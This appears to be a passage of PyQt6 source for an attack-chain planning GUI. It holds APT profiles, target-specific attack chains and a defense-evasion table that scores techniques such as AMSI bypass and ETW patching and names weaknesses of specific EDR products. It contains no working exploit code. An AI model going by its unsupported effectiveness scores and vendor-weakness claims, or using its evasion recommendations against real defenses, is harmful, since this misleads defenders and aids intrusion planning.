        'lazarus': APTProfile(
            apt_id='lazarus',
            name='Lazarus Group',
            aliases=['Hidden Cobra', 'Zinc', 'Guardians of Peace'],
            nation='North Korea',
            motivation='Financial/Espionage',
            targets=['Financial', 'Cryptocurrency', 'Entertainment', 'Defense'],
            tools=['FastCash', 'HOPLIGHT', 'ELECTRICFISH', 'AppleJeus'],
            techniques=['T1566.001', 'T1059.003', 'T1486', 'T1105', 'T1547.001'],
            chain_template=[
                ('Social Engineering', 'recon', 50, 100),
                ('Macro Document', 'exploit', 200, 100),
                ('PowerShell Stager', 'payload', 350, 100),
                ('HOPLIGHT RAT', 'payload', 500, 100),
                ('DLL Side-Loading', 'persistence', 650, 100),
                ('Cryptocurrency Theft', 'exfil', 800, 100),
            ]
        ),
        'fin7': APTProfile(
            apt_id='fin7',
            name='FIN7 - Carbanak',
            aliases=['Carbanak', 'Navigator', 'Anunak'],
            nation='Unknown (E. Europe)',
            motivation='Financial',
            targets=['Retail', 'Hospitality', 'Restaurant', 'Financial'],
            tools=['Carbanak', 'PILLOWMINT', 'GRIFFON', 'BELLHOP'],
            techniques=['T1566.001', 'T1059.001', 'T1055', 'T1041', 'T1560'],
            chain_template=[
                ('Phishing Campaign', 'recon', 50, 100),
                ('Malicious Doc', 'exploit', 200, 100),
                ('JavaScript Stager', 'payload', 350, 100),
                ('Carbanak RAT', 'payload', 500, 100),
                ('Scheduled Task', 'persistence', 650, 100),
                ('POS Data Exfil', 'exfil', 800, 100),
            ]
        ),
        'turla': APTProfile(
            apt_id='turla',
            name='Turla - Venomous Bear',
            aliases=['Waterbug', 'VENOMOUS BEAR', 'Group 88'],
            nation='Russia',
            motivation='Espionage',
            targets=['Government', 'Military', 'Diplomatic', 'Research'],
            tools=['Kazuar', 'Carbon', 'Snake', 'LightNeuron'],
            techniques=['T1190', 'T1047', 'T1021.002', 'T1059.003', 'T1036'],
            chain_template=[
                ('Watering Hole', 'recon', 50, 100),
                ('Drive-by Download', 'exploit', 200, 100),
                ('Carbon Installer', 'payload', 350, 100),
                ('Snake Rootkit', 'payload', 500, 100),
                ('COM Object Hijack', 'persistence', 650, 100),
                ('Satellite C2', 'exfil', 800, 100),
            ]
        ),
    }
    
    @classmethod
    def get_apt_list(cls) -> List[Dict]:
        """Get list of available APT profiles"""
        return [
            {
                'id': apt_id,
                'name': profile.name,
                'nation': profile.nation,
                'motivation': profile.motivation,
            }
            for apt_id, profile in cls.APT_PROFILES.items()
        ]
    
    @classmethod
    def get_apt_profile(cls, apt_id: str) -> Optional[APTProfile]:
        """Get APT profile by ID"""
        return cls.APT_PROFILES.get(apt_id)
    
    @classmethod
    def generate_chain(cls, apt_id: str) -> Optional[List[tuple]]:
        """Generate attack chain from APT profile"""
        profile = cls.APT_PROFILES.get(apt_id)
        if profile:
            return profile.chain_template
        return None


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# DEFENSE EVASION MATRIX - EDR/AV Bypass Techniques
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

@dataclass
class EvasionTechnique:
    """Defense evasion technique"""
    technique_id: str
    name: str
    description: str
    effectiveness: float  # 0-1
    complexity: str  # low, medium, high
    detection_sources: List[str]
    mitre_id: str


class DefenseEvasionMatrix:
    """Matrix of defense evasion techniques"""
    
    EVASION_TECHNIQUES = {
        'process_injection': EvasionTechnique(
            technique_id='process_injection',
            name='Process Injection',
            description='Inject malicious code into legitimate processes',
            effectiveness=0.75,
            complexity='high',
            detection_sources=['EDR', 'Memory Forensics'],
            mitre_id='T1055'
        ),
        'dll_sideloading': EvasionTechnique(
            technique_id='dll_sideloading',
            name='DLL Side-Loading',
            description='Load malicious DLLs via legitimate applications',
            effectiveness=0.80,
            complexity='medium',
            detection_sources=['EDR', 'Application Whitelisting'],
            mitre_id='T1574.002'
        ),
        'timestomping': EvasionTechnique(
            technique_id='timestomping',
            name='Timestomping',
            description='Modify file timestamps to evade detection',
            effectiveness=0.60,
            complexity='low',
            detection_sources=['MFT Analysis', 'Forensics'],
            mitre_id='T1070.006'
        ),
        'amsi_bypass': EvasionTechnique(
            technique_id='amsi_bypass',
            name='AMSI Bypass',
            description='Bypass Windows Antimalware Scan Interface',
            effectiveness=0.85,
            complexity='medium',
            detection_sources=['Memory Scanning', 'Script Block Logging'],
            mitre_id='T1562.001'
        ),
        'etw_patching': EvasionTechnique(
            technique_id='etw_patching',
            name='ETW Patching',
            description='Disable Event Tracing for Windows',
            effectiveness=0.90,
            complexity='high',
            detection_sources=['Kernel Monitoring', 'Integrity Checks'],
            mitre_id='T1562.006'
        ),
        'unhooking': EvasionTechnique(
            technique_id='unhooking',
            name='API Unhooking',
            description='Remove EDR hooks from NTDLL',
            effectiveness=0.85,
            complexity='high',
            detection_sources=['Kernel Callbacks', 'Driver Monitoring'],
            mitre_id='T1562.001'
        ),
        'direct_syscalls': EvasionTechnique(
            technique_id='direct_syscalls',
            name='Direct Syscalls',
            description='Bypass user-mode hooks via direct kernel calls',
            effectiveness=0.95,
            complexity='high',
            detection_sources=['Kernel ETW', 'Syscall Monitoring'],
            mitre_id='T1106'
        ),
        'reflective_loading': EvasionTechnique(
            technique_id='reflective_loading',
            name='Reflective DLL Loading',
            description='Load DLLs directly from memory',
            effectiveness=0.80,
            complexity='high',
            detection_sources=['Memory Scanning', 'Behavioral Analysis'],
            mitre_id='T1620'
        ),
        'code_signing': EvasionTechnique(
            technique_id='code_signing',
            name='Code Signing Abuse',
            description='Use stolen or forged code signing certificates',
            effectiveness=0.75,
            complexity='medium',
            detection_sources=['Certificate Monitoring', 'Code Analysis'],
            mitre_id='T1553.002'
        ),
        'obfuscation': EvasionTechnique(
            technique_id='obfuscation',
            name='Payload Obfuscation',
            description='Obfuscate malware to evade signature detection',
            effectiveness=0.70,
            complexity='low',
            detection_sources=['Behavioral Analysis', 'Sandbox'],
            mitre_id='T1027'
        ),
    }
    
    EDR_PRODUCTS = {
        'crowdstrike': {
            'name': 'CrowdStrike Falcon',
            'weak_against': ['direct_syscalls', 'kernel_exploits'],
            'strong_against': ['process_injection', 'dll_sideloading', 'amsi_bypass'],
        },
        'carbon_black': {
            'name': 'VMware Carbon Black',
            'weak_against': ['reflective_loading', 'timestomping'],
            'strong_against': ['obfuscation', 'process_injection'],
        },
        'defender_atp': {
            'name': 'Microsoft Defender ATP',
            'weak_against': ['code_signing', 'lolbins'],
            'strong_against': ['amsi_bypass', 'etw_patching', 'powershell_attacks'],
        },
        'sentinelone': {
            'name': 'SentinelOne',
            'weak_against': ['direct_syscalls', 'unhooking'],
            'strong_against': ['dll_sideloading', 'obfuscation'],
        },
    }
    
    @classmethod
    def get_evasion_recommendations(cls, target_edr: str) -> List[EvasionTechnique]:
        """Get recommended evasion techniques for specific EDR"""
        edr = cls.EDR_PRODUCTS.get(target_edr, {})
        weak_against = edr.get('weak_against', [])
        
        recommendations = []
        for technique_id in weak_against:
            if technique_id in cls.EVASION_TECHNIQUES:
                recommendations.append(cls.EVASION_TECHNIQUES[technique_id])
        
        # Add high-effectiveness techniques
        for tech_id, technique in cls.EVASION_TECHNIQUES.items():
            if tech_id not in weak_against and technique.effectiveness >= 0.85:
                recommendations.append(technique)
        
        return sorted(recommendations, key=lambda t: -t.effectiveness)
    
    @classmethod
    def calculate_evasion_score(cls, techniques: List[str]) -> float:
        """Calculate overall evasion effectiveness"""
        if not techniques:
            return 0.0
        
        total_effectiveness = 0
        for tech_id in techniques:
            if tech_id in cls.EVASION_TECHNIQUES:
                total_effectiveness += cls.EVASION_TECHNIQUES[tech_id].effectiveness
        
        return min(1.0, total_effectiveness / len(techniques))


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# AUTO-CHAIN GENERATOR - AI-Powered Chain Generation
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class AutoChainGenerator:
    """Automatically generate attack chains based on target profile"""
    
    TARGET_PROFILES = {
        'enterprise_windows': {
            'name': 'Enterprise Windows',
            'common_services': ['AD', 'Exchange', 'SharePoint', 'SQL Server'],
            'likely_defenses': ['EDR', 'Firewall', 'SIEM'],
            'recommended_chain': [
                ('AD Enumeration', 'recon'),
                ('Kerberoasting', 'exploit'),
                ('Pass-the-Hash', 'exploit'),
                ('Cobalt Strike', 'payload'),
                ('Golden Ticket', 'persistence'),
                ('SMB Exfil', 'exfil'),
            ]
        },
        'cloud_aws': {
            'name': 'AWS Cloud',
            'common_services': ['EC2', 'S3', 'Lambda', 'RDS'],
            'likely_defenses': ['CloudTrail', 'GuardDuty', 'SecurityHub'],
            'recommended_chain': [
                ('IAM Recon', 'recon'),
                ('SSRF to IMDS', 'exploit'),
                ('Role Assumption', 'exploit'),
                ('Lambda Backdoor', 'payload'),
                ('CloudWatch Disable', 'persistence'),
                ('S3 Exfil', 'exfil'),
            ]
        },
        'web_application': {
            'name': 'Web Application',
            'common_services': ['Apache/Nginx', 'PHP/Node', 'MySQL/PostgreSQL'],
            'likely_defenses': ['WAF', 'Rate Limiting', 'HTTPS'],
            'recommended_chain': [
                ('Tech Fingerprint', 'recon'),
                ('SQL Injection', 'exploit'),
                ('Web Shell Upload', 'payload'),
                ('Reverse Shell', 'payload'),
                ('Cron Persistence', 'persistence'),
                ('DNS Exfil', 'exfil'),
            ]
        },
        'iot_scada': {
            'name': 'IoT/SCADA',
            'common_services': ['Modbus', 'DNP3', 'OPC-UA', 'MQTT'],
            'likely_defenses': ['Air Gap', 'Network Segmentation'],
            'recommended_chain': [
                ('Protocol Scan', 'recon'),
                ('PLC Exploit', 'exploit'),
                ('Firmware Mod', 'payload'),
                ('HMI Backdoor', 'persistence'),
                ('Sensor Manip', 'exfil'),
            ]
        },
    }
    
    @classmethod
    def generate_chain(cls, target_type: str, complexity: str = 'medium') -> List[tuple]:
        """Generate chain for target type"""
        profile = cls.TARGET_PROFILES.get(target_type, cls.TARGET_PROFILES['enterprise_windows'])
        chain = profile['recommended_chain']
        
        # Adjust based on complexity
        if complexity == 'low':
            chain = chain[:3]  # Simple chain
        elif complexity == 'high':
            # Add additional steps
            chain = chain + [
                ('Lateral Movement', 'exploit'),
                ('Privilege Escalation', 'exploit'),
            ]
        
        # Convert to position format
        result = []
        for i, (name, node_type) in enumerate(chain):
            x = 50 + (i * 150)
            y = 100 + ((i % 2) * 50)  # Stagger for visibility
            result.append((name, node_type, x, y))
        
        return result
    
    @classmethod
    def suggest_next_step(cls, current_chain: List[dict]) -> List[Dict]:
        """Suggest next steps based on current chain"""
        suggestions = []
        
        if not current_chain:
            suggestions.append({
                'name': 'Start with Reconnaissance',
                'type': 'recon',
                'reason': 'Every attack chain should begin with reconnaissance'
            })
            return suggestions
        
        last_node = current_chain[-1]
        last_type = last_node.get('type', 'exploit')
        
        # Suggest based on last node type
        next_steps = {
            'recon': [
                ('Vulnerability Scan', 'exploit', 'Identify exploitable vulnerabilities'),
                ('Credential Harvesting', 'exploit', 'Gather credentials for access'),
            ],
            'exploit': [
                ('Deploy Payload', 'payload', 'Establish foothold with payload'),
                ('Privilege Escalation', 'exploit', 'Elevate access rights'),
            ],
            'payload': [
                ('Establish Persistence', 'persistence', 'Maintain long-term access'),
                ('Lateral Movement', 'exploit', 'Expand access in network'),
            ],
            'persistence': [
                ('Data Exfiltration', 'exfil', 'Extract valuable data'),
                ('C2 Channel', 'payload', 'Establish command channel'),
            ],
            'exfil': [
                ('Cover Tracks', 'persistence', 'Remove evidence of intrusion'),
            ],
        }
        
        for name, node_type, reason in next_steps.get(last_type, []):
            suggestions.append({
                'name': name,
                'type': node_type,
                'reason': reason
            })
        
        return suggestions


class DraggableExploitItem(QFrame):
    """A draggable exploit item that can be dropped onto the canvas"""
    
    def __init__(self, name: str, exploit_type: str, parent=None):
        super().__init__(parent)
        self.exploit_name = name
        self.exploit_type = exploit_type
        self.setup_ui()
    
    def setup_ui(self):
        type_colors = {
            'recon': '#0088ff',
            'exploit': '#ff8800',
            'payload': '#ff0000',
            'persistence': '#ff00ff',
            'exfil': '#00ff00'
        }
        color = type_colors.get(self.exploit_type, '#00ff00')
        
        icons = {
            'recon': 'üîç',
            'exploit': 'üí•',
            'payload': 'üéØ',
            'persistence': 'üîí',
            'exfil': 'üì§'
        }
        icon = icons.get(self.exploit_type, '‚ö°')
        
        self.setStyleSheet(f"""
            DraggableExploitItem {{
                background: {color}22;
                border: 2px solid {color};
                border-radius: 6px;
                padding: 8px;
            }}
            DraggableExploitItem:hover {{
                background: {color}44;
                cursor: grab;
            }}
        """)
        self.setCursor(QCursor(Qt.CursorShape.OpenHandCursor))
        
        layout = QHBoxLayout(self)
        layout.setContentsMargins(8, 4, 8, 4)
        
        icon_label = QLabel(icon)
        icon_label.setStyleSheet("font-size: 16px;")
        layout.addWidget(icon_label)
        
        name_label = QLabel(self.exploit_name)
        name_label.setStyleSheet(f"color: {color}; font-weight: bold;")
        layout.addWidget(name_label, 1)
        
        type_badge = QLabel(self.exploit_type[:3].upper())
        type_badge.setStyleSheet(f"color: {color}; font-size: 9px;")
        layout.addWidget(type_badge)
    
    def mousePressEvent(self, event):
        if event.button() == Qt.MouseButton.LeftButton:
            self.drag_start_position = event.pos()
        super().mousePressEvent(event)
    
    def mouseMoveEvent(self, event):
        if not (event.buttons() & Qt.MouseButton.LeftButton):
            return
        
        if (event.pos() - self.drag_start_position).manhattanLength() < QApplication.startDragDistance():
            return
        
        # Create drag
        drag = QDrag(self)
        mime_data = QMimeData()
        
        # Store exploit data
        data = {
            'name': self.exploit_name,
            'type': self.exploit_type
        }
        mime_data.setData('application/x-exploit', json.dumps(data).encode())
        mime_data.setText(self.exploit_name)
        
        drag.setMimeData(mime_data)
        
        # Create drag pixmap
        pixmap = QPixmap(self.size())
        pixmap.fill(Qt.GlobalColor.transparent)
        painter = QPainter(pixmap)
        self.render(painter)
        painter.end()
        drag.setPixmap(pixmap)
        drag.setHotSpot(event.pos())
        
        self.setCursor(QCursor(Qt.CursorShape.ClosedHandCursor))
        drag.exec(Qt.DropAction.CopyAction)
        self.setCursor(QCursor(Qt.CursorShape.OpenHandCursor))


class ExploitNodeWidget(QFrame):
    """Widget representing a single exploit in the chain"""
    
    clicked = pyqtSignal(str)
    
    def __init__(self, node_id: str, name: str, node_type: str = 'exploit', parent=None):
        super().__init__(parent)
        self.node_id = node_id
        self.name = name
        self.node_type = node_type
        self.is_selected = False
        self.setup_ui()
    
    def setup_ui(self):
        type_colors = {
            'recon': '#0088ff',
            'exploit': '#ff8800',
            'payload': '#ff0000',
            'persistence': '#ff00ff',
            'exfil': '#00ff00'
        }
        
        color = type_colors.get(self.node_type, '#00ff00')
        
        self.setFrameStyle(QFrame.Shape.StyledPanel)
        self.setStyleSheet(f"""
            QFrame {{
                background: {color}22;
                border: 2px solid {color};
                border-radius: 6px;
                padding: 8px;
            }}
            QFrame:hover {{
                background: {color}44;
            }}
        """)
        
        layout = QVBoxLayout(self)
        layout.setSpacing(4)
        
        # Icon and name
        header = QHBoxLayout()
        
        icons = {
            'recon': 'üîç',
            'exploit': 'üí•',
            'payload': 'üéØ',
            'persistence': 'üîí',
            'exfil': 'üì§'
        }
        
        icon = QLabel(icons.get(self.node_type, '‚ö°'))
        icon.setStyleSheet("font-size: 18px;")
        header.addWidget(icon)
        
        name_label = QLabel(self.name)
        name_label.setStyleSheet(f"color: {color}; font-weight: bold;")
        header.addWidget(name_label, 1)
        
        layout.addLayout(header)
        
        # Type badge
        type_badge = QLabel(self.node_type.upper())
        type_badge.setStyleSheet(f"""
            color: {color};
            font-size: 9px;
            background: {color}22;
            padding: 1px 4px;
            border-radius: 2px;
        """)
        layout.addWidget(type_badge)
        
        self.setMinimumWidth(150)
        self.setMaximumWidth(200)
    
    def mousePressEvent(self, event):
        if event.button() == Qt.MouseButton.LeftButton:
            self.clicked.emit(self.node_id)
        super().mousePressEvent(event)


class ChainCanvas(QWidget):
    """Canvas for visualizing and building exploit chains with drag-drop support and animated execution"""
    
    node_clicked = pyqtSignal(dict)  # Emitted when a node is clicked
    node_deleted = pyqtSignal(str)   # Emitted when a node is deleted
    execution_step = pyqtSignal(int, str)  # Step index and status
    branch_created = pyqtSignal(str, str, str)  # source_id, success_target, failure_target
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.nodes = []
        self.connections = []
        self.branches = {}  # Dict[node_id, ConditionalBranch]
        self.failure_connections = []  # Red failure path connections
        self.selected_node = None
        self.selected_node_id = None
        self.drop_preview_pos = None
        self.dragging_node = None
        self.drag_offset = QPoint(0, 0)
        
        # Connection creation mode
        self.creating_connection = False
        self.connection_source = None
        self.connection_type = 'success'  # 'success' or 'failure'
        self.mouse_pos = QPoint(0, 0)
        
        # Animation state
        self.is_executing = False
        self.current_execution_step = -1
        self.execution_progress = 0.0  # 0.0 to 1.0 for packet animation
        self.executed_nodes = set()
        self.failed_nodes = set()
        
        # Simulation mode
        self.is_simulating = False
        self.simulation_results = None
        
        # Particle effects for connections
        self.particles = []
        
        # Animation timer
        self.anim_timer = QTimer()
        self.anim_timer.timeout.connect(self._animate)
        self.anim_timer.start(30)  # ~33 FPS
        
        self.setMinimumSize(600, 400)
        self.setAcceptDrops(True)
        self.setMouseTracking(True)
        self.setFocusPolicy(Qt.FocusPolicy.StrongFocus)  # Enable keyboard events
    
    def start_branch_creation(self, node_id: str, branch_type: str = 'success'):
        """Start creating a conditional branch from a node"""
        self.creating_connection = True
        self.connection_source = node_id
        self.connection_type = branch_type
        self.setCursor(Qt.CursorShape.CrossCursor)
    
    def cancel_branch_creation(self):
        """Cancel branch creation mode"""
        self.creating_connection = False
        self.connection_source = None
        self.setCursor(Qt.CursorShape.ArrowCursor)
    
    def add_branch(self, source_id: str, target_id: str, branch_type: str = 'success'):
        """Add a conditional branch between nodes"""
        if source_id not in self.branches:
            self.branches[source_id] = ConditionalBranch(source_node_id=source_id)
        
        if branch_type == 'success':
            self.branches[source_id].success_target_id = target_id
        else:
            self.branches[source_id].failure_target_id = target_id
            self.failure_connections.append((source_id, target_id))
        
        self.branch_created.emit(source_id, 
            self.branches[source_id].success_target_id or '',
            self.branches[source_id].failure_target_id or '')
        self.update()
    
    def _animate(self):
        """Animation loop for particles and execution flow"""
        if self.is_executing:
            self.execution_progress += 0.02
            if self.execution_progress >= 1.0:
                self.execution_progress = 0.0
        
        # Update particles
        for particle in self.particles[:]:
            particle['progress'] += particle['speed']
            if particle['progress'] >= 1.0:
                self.particles.remove(particle)
        
        # Add new particles during execution
        if self.is_executing and len(self.particles) < 20:
            if self.connections and self.current_execution_step >= 0:
                for from_id, to_id in self.connections:
                    from_node = next((n for n in self.nodes if n['id'] == from_id), None)
                    to_node = next((n for n in self.nodes if n['id'] == to_id), None)
                    if from_node and to_node and from_id in self.executed_nodes:
                        import random
                        if random.random() < 0.1:
                            self.particles.append({
                                'from': from_id,
                                'to': to_id,
                                'progress': 0.0,
                                'speed': 0.02 + random.random() * 0.02,
                                'size': 3 + random.randint(0, 3)
                            })
        
        self.update()
    
    def start_execution(self, step: int = 0):
        """Start animated execution at given step"""
        self.is_executing = True
        self.current_execution_step = step
        self.execution_progress = 0.0
        if step < len(self.nodes):
            self.executed_nodes.add(self.nodes[step]['id'])
        self.update()
    
    def advance_execution(self):
        """Advance to next execution step"""
        self.current_execution_step += 1
        if self.current_execution_step < len(self.nodes):
            self.executed_nodes.add(self.nodes[self.current_execution_step]['id'])
            self.execution_step.emit(self.current_execution_step, 'running')
        else:
            self.stop_execution()
    
    def fail_execution(self, node_id: str):
        """Mark a node as failed"""
        self.failed_nodes.add(node_id)
        self.update()
    
    def stop_execution(self):
        """Stop animated execution"""
        self.is_executing = False
        self.current_execution_step = -1
        self.execution_progress = 0.0
        self.executed_nodes.clear()
        self.failed_nodes.clear()
        self.particles.clear()
        self.update()
    
    def add_node(self, node_id: str, name: str, node_type: str, x: int, y: int, 
                 cve: str = None, mitre_id: str = None, success_probability: float = None,
                 payload_type: str = None, obfuscation: str = None, evasion: str = None):
        # Get default success probability based on type
        if success_probability is None:
            success_probability = EXPLOIT_SUCCESS_RATES.get(node_type, {}).get('base', 0.7)
        
        self.nodes.append({
            'id': node_id,
            'name': name,
            'type': node_type,
            'x': x,
            'y': y,
            'cve': cve,
            'mitre_id': mitre_id,
            'success_probability': success_probability,
            'payload_type': payload_type,
            'obfuscation': obfuscation,
            'evasion': evasion,
        })
        self.update()
    
    def get_node_success_probability(self, node_id: str) -> float:
        """Calculate effective success probability including modifiers"""
        node = next((n for n in self.nodes if n['id'] == node_id), None)
        if not node:
            return 0.7
        
        base_prob = node.get('success_probability', 0.7)
        
        # Apply payload modifier
        payload_type = node.get('payload_type')
        if payload_type and payload_type in PayloadCustomizer.PAYLOAD_TYPES:
            base_prob += PayloadCustomizer.PAYLOAD_TYPES[payload_type].get('success_modifier', 0)
        
        # Apply obfuscation modifier
        obfuscation = node.get('obfuscation')
        if obfuscation:
            for tech_id, _, modifier in PayloadCustomizer.OBFUSCATION_TECHNIQUES:
                if tech_id == obfuscation:
                    base_prob += modifier
                    break
        
        # Apply evasion modifier
        evasion = node.get('evasion')
        if evasion:
            for tech_id, _, modifier in PayloadCustomizer.EVASION_TECHNIQUES:
                if tech_id == evasion:
                    base_prob += modifier
                    break
        
        return min(0.99, max(0.01, base_prob))
    
    def connect_nodes(self, from_id: str, to_id: str):
        self.connections.append((from_id, to_id))
        self.update()
    
    def dragEnterEvent(self, event):
        """Accept exploit drops from the tree or DraggableExploitItem"""
        if event.mimeData().hasFormat('application/x-exploit') or event.mimeData().hasText():
            event.setDropAction(Qt.DropAction.CopyAction)
            event.accept()
            self.drop_preview_pos = event.position().toPoint()
            self.update()
        else:
            event.ignore()
    
    def dragMoveEvent(self, event):
        """Update drop preview position"""
        if event.mimeData().hasFormat('application/x-exploit') or event.mimeData().hasText():
            event.setDropAction(Qt.DropAction.CopyAction)
            event.accept()
            self.drop_preview_pos = event.position().toPoint()
            self.update()
        else:
            event.ignore()
    
    def dragLeaveEvent(self, event):
        """Clear drop preview when drag leaves"""
        self.drop_preview_pos = None
        self.update()
        event.accept()
    
    def dropEvent(self, event):
        """Handle drop - create new node at drop position"""
        self.drop_preview_pos = None
        
        # Get exploit data from mime data
        if event.mimeData().hasFormat('application/x-exploit'):
            data = json.loads(event.mimeData().data('application/x-exploit').data().decode())
            name = data.get('name', 'Unknown')
            exp_type = data.get('type', 'exploit')
        elif event.mimeData().hasText():
            name = event.mimeData().text()
            exp_type = 'exploit'
        else:
            event.ignore()
            return
        
        # Create node at drop position
        pos = event.position().toPoint()
        node_id = f"node_{len(self.nodes) + 1}"
        x = max(10, pos.x() - 60)
        y = max(10, pos.y() - 30)
        
        self.add_node(node_id, name, exp_type, x, y)
        
        # Auto-connect to previous node
        if len(self.nodes) > 1:
            prev_node = self.nodes[-2]
            self.connect_nodes(prev_node['id'], node_id)
        
        event.setDropAction(Qt.DropAction.CopyAction)
        event.accept()
        
        # Notify parent to update stats
        parent = self.parent()
        while parent:
            if hasattr(parent, 'update_stats'):
                parent.update_stats()
                break
            parent = parent.parent()
    
    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.RenderHint.Antialiasing)
        
        # Background with subtle gradient
        bg_gradient = QLinearGradient(0, 0, 0, self.height())
        bg_gradient.setColorAt(0, QColor(8, 8, 12))
        bg_gradient.setColorAt(1, QColor(15, 15, 25))
        painter.fillRect(self.rect(), bg_gradient)
        
        # Animated grid with glow effect
        grid_alpha = 30 + int(10 * math.sin(self.execution_progress * math.pi * 2)) if self.is_executing else 30
        painter.setPen(QPen(QColor(40, 40, 50, grid_alpha), 1))
        for x in range(0, self.width(), 50):
            painter.drawLine(x, 0, x, self.height())
        for y in range(0, self.height(), 50):
            painter.drawLine(0, y, self.width(), y)
        
        type_colors = {
            'recon': QColor(0, 136, 255),
            'exploit': QColor(255, 136, 0),
            'payload': QColor(255, 0, 0),
            'persistence': QColor(255, 0, 255),
            'exfil': QColor(0, 255, 0)
        }
        
        # Draw connections with curved paths and animated flow
        for from_id, to_id in self.connections:
            from_node = next((n for n in self.nodes if n['id'] == from_id), None)
            to_node = next((n for n in self.nodes if n['id'] == to_id), None)
            
            if from_node and to_node:
                color = type_colors.get(from_node['type'], QColor(0, 255, 0))
                
                x1, y1 = from_node['x'] + 120, from_node['y'] + 30
                x2, y2 = to_node['x'], to_node['y'] + 30
                
                # Execution glow effect
                is_active = from_id in self.executed_nodes and self.is_executing
                if is_active:
                    glow_color = QColor(color.red(), color.green(), color.blue(), 100)
                    painter.setPen(QPen(glow_color, 8))
                    painter.drawLine(int(x1), int(y1), int(x2), int(y2))
                
                # Draw bezier curve for better visual appeal
                path = QPainterPath()
                path.moveTo(x1, y1)
                
                # Control points for curve
                ctrl_x = (x1 + x2) / 2
                ctrl_y1 = y1
                ctrl_y2 = y2
                
                path.cubicTo(ctrl_x, ctrl_y1, ctrl_x, ctrl_y2, x2, y2)
                
                line_width = 3 if is_active else 2
                painter.setPen(QPen(color, line_width))
                painter.setBrush(Qt.BrushStyle.NoBrush)
                painter.drawPath(path)
                
                # Arrowhead
                angle = math.atan2(y2 - ctrl_y2, x2 - ctrl_x)
                arrow_size = 12 if is_active else 10
                
                p1_x = x2 - arrow_size * math.cos(angle - math.pi/6)
                p1_y = y2 - arrow_size * math.sin(angle - math.pi/6)
                p2_x = x2 - arrow_size * math.cos(angle + math.pi/6)
                p2_y = y2 - arrow_size * math.sin(angle + math.pi/6)
                
                from PyQt6.QtCore import QPointF
                painter.setBrush(QBrush(color))
                painter.drawPolygon([QPointF(x2, y2), QPointF(p1_x, p1_y), QPointF(p2_x, p2_y)])
        
        # Draw failure path connections (red dashed lines)
        for from_id, to_id in self.failure_connections:
            from_node = next((n for n in self.nodes if n['id'] == from_id), None)
            to_node = next((n for n in self.nodes if n['id'] == to_id), None)
            
            if from_node and to_node:
                x1, y1 = from_node['x'] + 120, from_node['y'] + 45  # Lower connection point
                x2, y2 = to_node['x'], to_node['y'] + 45
                
                # Red dashed line for failure path
                failure_pen = QPen(QColor(255, 80, 80), 2, Qt.PenStyle.DashLine)
                painter.setPen(failure_pen)
                
                path = QPainterPath()
                path.moveTo(x1, y1)
                ctrl_x = (x1 + x2) / 2
                path.cubicTo(ctrl_x, y1 + 30, ctrl_x, y2 + 30, x2, y2)
                painter.drawPath(path)
                
                # "X" label for failure
                mid_x = (x1 + x2) / 2
                mid_y = (y1 + y2) / 2 + 15
                painter.setFont(QFont('Consolas', 8, QFont.Weight.Bold))
                painter.drawText(int(mid_x) - 5, int(mid_y), "‚ùå")
        
        # Draw branch creation preview
        if self.creating_connection and self.connection_source:
            source_node = next((n for n in self.nodes if n['id'] == self.connection_source), None)
            if source_node:
                x1 = source_node['x'] + 120
                y1 = source_node['y'] + (30 if self.connection_type == 'success' else 45)
                
